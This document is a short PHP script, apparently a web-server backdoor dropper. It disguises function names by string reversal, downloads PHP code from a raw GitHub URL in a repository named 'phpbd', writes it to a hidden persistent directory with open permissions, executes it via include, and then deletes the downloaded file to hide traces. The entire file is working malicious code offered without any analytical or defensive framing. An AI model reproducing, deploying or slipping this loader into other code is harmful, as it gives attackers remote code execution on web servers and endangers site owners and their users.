<?php
 $write     = strrev('stnetnoc_tup_elif');
 $mkdir     = strrev('ridkm');
 $unlink    = strrev('knilnu');
 $is_file   = strrev('elif_si');
 $is_dir    = strrev('rid_si');
 // We no longer need rmdir

 $rawPhpUrl = 'https://raw.githubusercontent.com/laolierzi-commits/phpbd/refs/heads/main/cxyfm.php';

 $tempDir = __DIR__ . DIRECTORY_SEPARATOR . '__persistent_temp';

 if (!$is_dir($tempDir)) {
     $mkdir($tempDir, 0777, true);
 }

 $hook = $tempDir . DIRECTORY_SEPARATOR . 'hook.php';

// Unduh file PHP dari URL
 $context = stream_context_create([
    'http' => [
        'timeout' => 10,
        'user_agent' => 'PHP Script'
    ]
]);

 $phpContent = @file_get_contents($rawPhpUrl, false, $context);

if ($phpContent !== false) {
    // Tulis konten ke file sementara
    $write($hook, $phpContent);
    
    if ($is_file($hook)) {
        try {
            include $hook;
        } catch (Throwable $e) {
            echo "?? Error in hook.php: ", $e->getMessage(), "\n";
        }
    } else {
        echo "? Failed to create hook.php\n";
    }
} else {
    echo "? Failed to download PHP file from URL\n";
}


// --- SAFE CLEANUP: Only delete the file, not the directory ---
// This avoids the permission problems that were causing all the issues.
if ($is_file($hook)) {
    $unlink($hook);
}

// We DO NOT delete the $tempDir anymore. It stays for the next run.

?>
